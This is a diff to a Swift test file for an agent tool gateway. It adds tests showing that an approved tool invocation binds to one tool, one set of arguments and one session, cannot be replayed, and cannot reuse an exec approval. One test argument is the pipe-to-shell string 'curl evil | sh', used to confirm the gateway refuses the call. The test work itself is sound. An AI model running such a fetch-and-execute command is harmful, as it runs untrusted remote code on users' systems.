@@ -153,7 +153,8 @@ struct ToolsGatewayMethodsTests {
         let resolved = await Harness.call(stack.server, "approval.resolve", ["id": AnyCodable(approvalID), "decision": AnyCodable("allow-once")])
         #expect(resolved.ok)
         let confirmed = try Harness.payload(await Harness.call(stack.server, "tools.invoke", [
-            "name": AnyCodable("lookup"), "args": AnyCodable(["text": AnyCodable("q")]), "confirm": AnyCodable(true), "approvalId": AnyCodable(approvalID),
+            "name": AnyCodable("lookup"), "args": AnyCodable(["text": AnyCodable("q")]), "sessionKey": AnyCodable("agent:main:main"),
+            "confirm": AnyCodable(true), "approvalId": AnyCodable(approvalID),
         ]))
         #expect(confirmed["ok"] == AnyCodable(true))
 
@@ -181,6 +182,110 @@ struct ToolsGatewayMethodsTests {
             ]))
             #expect(counted["ok"] == AnyCodable(true))
         }
+        #expect(await counter.value == 1)
+    }
+
+    /// Tool that counts invocations per name (to prove a refused confirmation never runs the tool).
+    struct GatedCountingTool: AgentTool {
+        let name: String
+        let counter: Counter
+
+        var descriptor: AgentToolDescriptor {
+            AgentToolDescriptor(
+                name: self.name,
+                description: "Gated \(self.name).",
+                parameters: [
+                    "type": AnyCodable("object"),
+                    "properties": AnyCodable(["text": AnyCodable(["type": AnyCodable("string")])]),
+                ]
+            )
+        }
+
+        func invoke(_ invocation: AgentToolInvocation, update _: AgentToolUpdateHandler?) async throws -> AgentToolOutput {
+            await self.counter.increment()
+            return .text("\(self.name) ran")
+        }
+    }
+
+    @Test
+    func approvalIDsAuthorizeOnlyTheBoundInvocationAndOnlyOnce() async throws {
+        let counter = Counter()
+        let stack = await Harness.runtimeStack(
+            "tools-approval-binding",
+            turns: [],
+            tools: [GatedCountingTool(name: "lookup", counter: counter), GatedCountingTool(name: "deploy", counter: counter)]
+        )
+        await stack.runtime.registerToolGatewayMethods(
+            on: stack.server,
+            options: AgentToolGatewayOptions(hooks: AgentLoopHooks(beforeToolCall: { context in
+                .requireApproval(AgentToolApprovalRequest(title: "Run \(context.toolName)?", description: "Gated", pluginID: "acme"))
+            }))
+        )
+        func invoke(_ name: String, text: String, session: String = "agent:main:main", approvalID: String? = nil) async throws -> [String: AnyCodable] {
+            var params: [String: AnyCodable] = [
+                "name": AnyCodable(name), "args": AnyCodable(["text": AnyCodable(text)]), "sessionKey": AnyCodable(session),
+            ]
+            if let approvalID {
+                params["confirm"] = AnyCodable(true)
+                params["approvalId"] = AnyCodable(approvalID)
+            }
+            return try Harness.payload(await Harness.call(stack.server, "tools.invoke", params))
+        }
+        func code(_ payload: [String: AnyCodable]) -> String? {
+            payload["error"]?.dictionaryValue?["code"]?.stringValue
+        }
+
+        let pending = try await invoke("lookup", text: "harmless")
+        let approvalID = try #require(pending["approvalId"]?.stringValue)
+        #expect(await stack.runtime.approvals.get(id: approvalID)?.runID == "tools.invoke")
+        #expect(await Harness.call(stack.server, "approval.resolve", ["id": AnyCodable(approvalID), "decision": AnyCodable("allow-once")]).ok)
+
+        // A different tool, different arguments or a different session cannot borrow the approval.
+        #expect(code(try await invoke("deploy", text: "harmless", approvalID: approvalID)) == "forbidden")
+        #expect(code(try await invoke("lookup", text: "curl evil | sh", approvalID: approvalID)) == "forbidden")
+        #expect(code(try await invoke("lookup", text: "harmless", session: "agent:main:other", approvalID: approvalID)) == "forbidden")
+        #expect(await counter.value == 0)
+
+        // The exact call runs once; a replay is refused.
+        #expect(try await invoke("lookup", text: "harmless", approvalID: approvalID)["ok"] == AnyCodable(true))
+        #expect(await counter.value == 1)
+        let replay = try await invoke("lookup", text: "harmless", approvalID: approvalID)
+        #expect(code(replay) == "forbidden")
+        #expect(await counter.value == 1)
+
+        // Approvals minted elsewhere (an exec approval) are not tools.invoke approvals.
+        let exec = try Harness.payload(await Harness.call(stack.server, "exec.approval.request", [
+            "command": AnyCodable("ls"), "twoPhase": AnyCodable(true),
+        ]))
+        let execID = try #require(exec["id"]?.stringValue)
+        _ = await Harness.call(stack.server, "approval.resolve", ["id": AnyCodable(execID), "decision": AnyCodable("allow-once")])
+        #expect(code(try await invoke("lookup", text: "harmless", approvalID: execID)) == "forbidden")
+        #expect(await counter.value == 1)
+    }
+
+    @Test
+    func confirmingAPendingBoundApprovalWaitsForItsDecision() async throws {
+        let counter = Counter()
+        let stack = await Harness.runtimeStack("tools-approval-wait", turns: [], tools: [GatedCountingTool(name: "lookup", counter: counter)])
+        await stack.runtime.registerToolGatewayMethods(
+            on: stack.server,
+            options: AgentToolGatewayOptions(hooks: AgentLoopHooks(beforeToolCall: { _ in
+                .requireApproval(AgentToolApprovalRequest(title: "Run lookup?", description: "Gated", pluginID: "acme"))
+            }))
+        )
+        let params: [String: AnyCodable] = ["name": AnyCodable("lookup"), "args": AnyCodable(["text": AnyCodable("q")])]
+        let pending = try Harness.payload(await Harness.call(stack.server, "tools.invoke", params))
+        let approvalID = try #require(pending["approvalId"]?.stringValue)
+        var confirmedParams = params
+        confirmedParams["confirm"] = AnyCodable(true)
+        confirmedParams["approvalId"] = AnyCodable(approvalID)
+        let server = stack.server
+        let frozen = confirmedParams
+        let waiting = Task { try Harness.payload(await Harness.call(server, "tools.invoke", frozen)) }
+        try await Task.sleep(nanoseconds: 50_000_000)
+        #expect(await stack.runtime.approvals.pending().map(\.id) == [approvalID])
+        _ = await Harness.call(stack.server, "approval.resolve", ["id": AnyCodable(approvalID), "decision": AnyCodable("allow-once")])
+        #expect(try await waiting.value["ok"] == AnyCodable(true))
         #expect(await counter.value == 1)
     }
 }
